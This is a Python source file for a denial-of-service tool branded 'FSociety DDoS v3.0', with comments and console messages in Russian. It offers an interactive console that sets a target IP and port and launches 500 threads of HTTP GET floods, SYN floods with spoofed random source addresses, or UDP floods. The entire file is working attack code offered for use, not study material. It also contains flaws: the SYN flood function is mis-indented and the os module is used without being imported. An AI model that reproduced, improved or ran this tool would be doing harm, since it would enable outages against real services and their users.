
# -*- coding: utf-8 -*-
# DDOS FSOCIETY BY XELS v3.0
import socket
import threading
import random
import time
import sys
from scapy.all import *

# ███████╗███████╗ ██████╗ ██████╗ ██╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██╔═══╝ ██║   ██║     ╚██╔╝  
# ██║     ███████║╚██████╔╝██║     ██║   ██║      ██║   
# ╚═╝     ╚══════╝ ╚═════╝ ╚═╝     ╚═╝   ╚═╝      ╚═╝   

class FSocietyDDoS:
    def __init__(self):
        self.attack_active = False
        self.threads = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
        ]
        self.target_ip = ""
        self.target_port = 80
        self.attack_time = 60
        self.thread_count = 500

    def show_banner(self):
        print(r"""
        ░▐█▀█▄▄▀▀█▄░▐██▀▀▀▀██▄██▀▀▀▀██▄░▐█▄░▄█▌
        ░▐█▄▀▀▀▄▀▀▀░░▀▀██▄██▀░▀▀██▄██▀░▐█▀██▀█▌
        ░▐█▄▄▄▄▄▄█▀░░░░▀▀██▀▀░░░░▀▀██▀▀░▐█▒█▒█░▌
        """)
        print("FSOCIETY DDOS FRAMEWORK v3.0")
        print("Type 'help' for commands\n")

    def http_flood(self):
        while self.attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, self.target_port))
                s.settimeout(1)
                
                # Создание HTTP-запроса
                request = f"GET /?{random.randint(0, 65535)} HTTP/1.1\r\n"
                request += f"Host: {self.target_ip}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                s.send(request.encode())
                s.close()
            except:
                pass

    def syn_flood(self):
    while self.attack_active:
        try:
            # Генерация случайных IP (ИСПРАВЛЕННАЯ ВЕРСИЯ)
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            # Создание SYN пакета
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
            packet = ip_layer / tcp_layer
            
            send(packet, verbose=0)
        except:
            pass

    def udp_flood(self):
        while self.attack_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1024)
                s.sendto(bytes, (self.target_ip, self.target_port))
                s.close()
            except:
                pass

    def start_attack(self, method):
        self.attack_active = True
        
        # Выбор метода атаки
        attack_method = self.http_flood
        if method == "syn":
            attack_method = self.syn_flood
        elif method == "udp":
            attack_method = self.udp_flood
        
        # Запуск потоков
        for _ in range(self.thread_count):
            t = threading.Thread(target=attack_method)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        print(f"[+] Атака начата на {self.target_ip}:{self.target_port}")
        print(f"[+] Метод: {method.upper()} | Потоки: {self.thread_count} | Время: {self.attack_time}сек")
        
        # Таймер атаки
        time.sleep(self.attack_time)
        self.stop_attack()

    def stop_attack(self):
        self.attack_active = False
        print("\n[!] Атака остановлена")
        for t in self.threads:
            t.join()
        self.threads = []

    def console(self):
        self.show_banner()
        while True:
            cmd = input("fsociety> ").strip().lower()
            
            if cmd == "exit":
                sys.exit(0)
                
            elif cmd == "help":
                print("\nКоманды:")
                print("  target <IP> [PORT] - Установить цель")
                print("  time <SECONDS>     - Время атаки")
                print("  threads <COUNT>    - Количество потоков")
                print("  http               - HTTP Flood атака")
                print("  syn                - SYN Flood атака")
                print("  udp                - UDP Flood атака")
                print("  stop               - Остановить атаку")
                print("  exit               - Выход\n")
                
            elif cmd.startswith("target"):
                try:
                    parts = cmd.split()
                    self.target_ip = parts[1]
                    if len(parts) > 2:
                        self.target_port = int(parts[2])
                    print(f"[+] Цель установлена: {self.target_ip}:{self.target_port}")
                except:
                    print("[!] Ошибка. Используйте: target <IP> [PORT]")
                    
            elif cmd.startswith("time"):
                try:
                    self.attack_time = int(cmd.split()[1])
                    print(f"[+] Время атаки: {self.attack_time} секунд")
                except:
                    print("[!] Ошибка. Используйте: time <SECONDS>")
                    
            elif cmd.startswith("threads"):
                try:
                    self.thread_count = int(cmd.split()[1])
                    print(f"[+] Потоки: {self.thread_count}")
                except:
                    print("[!] Ошибка. Используйте: threads <COUNT>")
                    
            elif cmd in ["http", "syn", "udp"]:
                if not self.target_ip:
                    print("[!] Сначала установите цель!")
                    continue
                self.start_attack(cmd)
                
            elif cmd == "stop":
                self.stop_attack()
                
            else:
                print("[!] Неизвестная команда. Введите 'help'")

if __name__ == "__main__":
    try:
        # Проверка прав (для SYN flood)
        if os.name == 'posix' and os.geteuid() != 0:
            print("[!] Требуются права root для SYN flood!")
        
        tool = FSocietyDDoS()
        tool.console()
    except KeyboardInterrupt:
        print("\n[!] Работа завершена")
        sys.exit(0)
